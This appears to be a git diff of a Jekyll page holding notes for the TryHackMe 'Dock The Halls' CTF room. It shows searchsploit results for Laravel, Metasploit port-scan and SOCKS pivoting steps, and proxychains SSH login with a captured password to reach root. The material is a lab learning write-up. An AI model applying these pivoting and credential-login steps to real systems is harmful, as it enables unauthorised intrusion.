@@ -1,27 +1,32 @@
 ---
 layout: default
-title: Notes
-parent: Dock The Halls 
-nav_order: 1
-grand_parent: Try Hack Me
-permalink: /tcm-sec_PEH/kioptrix/notes
+title: Dock The Halls
+has_children: false
+nav_order: 2
+parent: Try Hack Me
+permalink: /try-hack-me/dock-the-halls
 ---
 
-# Notes
+# Dock The Halls
+{: .no_toc}
 
-- [Notes](#notes)
-  - [nmap](#nmap)
-  - [Browser](#browser)
-  - [serchsploit](#serchsploit)
-  - [Metaspliot Framework Console](#metaspliot-framework-console)
-  - [Time to get to that Postgres DB](#time-to-get-to-that-postgres-db)
-  - [Scan the docker host](#scan-the-docker-host)
-    - [Either with metasploit](#either-with-metasploit)
-    - [Or use SOCKS Proxy](#or-use-socks-proxy)
-  - [Proxychains](#proxychains)
-  - [Connect via SSH](#connect-via-ssh)
-    - [Either using proxychains](#either-using-proxychains)
-    - [Or Metasploit](#or-metasploit)
+## Table of content
+{: .no_toc .text-delta}
+
+- TOC
+{:toc }
+
+## Description
+
+A room with the following learning objectives:
+
+- Using Metasploit modules and Meterpreter to compromise systems
+- Network Pivoting
+- Post exploitation
+
+## Flow
+
+![flow](../assets/TryHackMe/DockTheHalls/flow.drawio.svg)
 
 ## nmap
 
@@ -50,7 +55,22 @@ See:
 
 ## serchsploit
 
-![searchspliot results](../../assets/TryHackMe/DockTheHalls/searchsploit_laravel8.jpg)
+```console
+------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                             |  Path
+------------------------------------------------------------------------------------------- ---------------------------------
+Aimeos Laravel ecommerce platform 2021.10 LTS - 'sort' SQL injection                       | php/webapps/50538.txt
+Laravel - 'Hash::make()' Password Truncation Security                                      | multiple/remote/39318.txt
+Laravel 8.4.2 debug mode - Remote code execution                                           | php/webapps/49424.py
+Laravel Log Viewer < 0.13.0 - Local File Download                                          | php/webapps/44343.py
+Laravel Nova 3.7.0 - 'range' DoS                                                           | php/webapps/49198.txt
+PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forgery (CSRF)       | php/webapps/50525.txt
+PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution | linux/remote/47129.rb
+UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                  | php/webapps/48166.txt
+UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                         | php/webapps/46389.py
+------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
 
 ## Metaspliot Framework Console
 
@@ -205,12 +225,14 @@ Query Text: 'select * from users'
 ## Scan the docker host
 
 ### Either with metasploit
+{: .no_toc}
 
 - `search portscan`
 - `use auxiliary/scanner/portscan/tcp`
 - `set rhosts 172.17.0.1` and `run` - 22 & 80 open
 
 ### Or use SOCKS Proxy
+{: .no_toc}
 
 - `search socks` & `use 1` & `exploit`
 
@@ -246,12 +268,14 @@ Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
 ## Connect via SSH
 
 ### Either using proxychains
+{: .no_toc}
 
 - `proxychains ssh santa@172.17.0.1` & pw: `p4$$w0rd` -> root
 - `ls` & `cat root.tx`:
 `THM{47C61A0FA8738BA77308A8A600F88E4B}`
 
 ### Or Metasploit
+{: .no_toc}
 
 - `search ssh_login` & `use 0`
 - set 'rhosts', 'username' & 'password' & `exploit`
@@ -289,6 +313,6 @@ Active sessions
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-> WE ARE ROOT
+> WE GOT ROOT
 
 ---
